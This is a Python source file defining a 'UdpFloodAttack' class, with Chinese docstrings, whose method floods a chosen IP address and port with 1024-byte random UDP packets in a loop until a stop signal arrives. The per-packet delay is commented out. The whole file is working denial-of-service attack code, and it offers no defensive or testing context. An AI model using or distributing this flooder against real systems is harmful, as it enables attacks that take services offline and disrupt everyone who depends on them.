from os import urandom as randbytes
from multiprocessing import Queue
import socket


class UdpFloodAttack:
    @staticmethod
    def send_udp_packets(destination_ip: str, destination_port: int, stop_signal_queue: Queue):
        """
        进行 udp 数据包的发送
        :param destination_ip: 目的 ip
        :param destination_port: 目的端口
        :param stop_signal_queue: 停止信号队列
        :return:
        """
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        current_sent_packet = 1
        while True:
            if not stop_signal_queue.empty():
                break
            udp_socket.sendto(randbytes(1024), (destination_ip, destination_port))
            # time.sleep(1)
            # print(f"current {current_sent_packet} packet")
            current_sent_packet += 1
        return 0
